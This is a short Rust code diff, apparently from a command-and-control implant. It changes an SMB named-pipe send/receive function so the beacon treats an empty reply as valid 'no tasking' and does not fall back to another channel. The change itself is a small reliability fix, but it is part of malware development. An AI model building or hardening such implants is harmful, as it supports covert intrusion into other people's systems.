@@ -317,11 +317,14 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
         crate::entry::diag_mark(b"ERR_CH_SMB_RDPAYLOAD");
         return None;
     }
-    if resp.is_empty() {
-        None
-    } else {
-        Some(resp)
-    }
+    // A zero-length payload is VALID "no tasking" from the pipe server (the
+    // read-phase already treated length 0 as a valid empty reply above). Return
+    // Some(empty) so the beacon treats the round-trip as SUCCESS — counter
+    // advances, the pending batch clears — instead of None, which would be read
+    // as a channel failure and trigger a fallback switch + batch retry. The
+    // caller (beacon_dispatch_tasks) parses an empty body as "no tasks" and
+    // keeps looping.
+    Some(resp)
 }
 
 /// Write the entirety of `buf` to the pipe, looping on partial writes. Returns
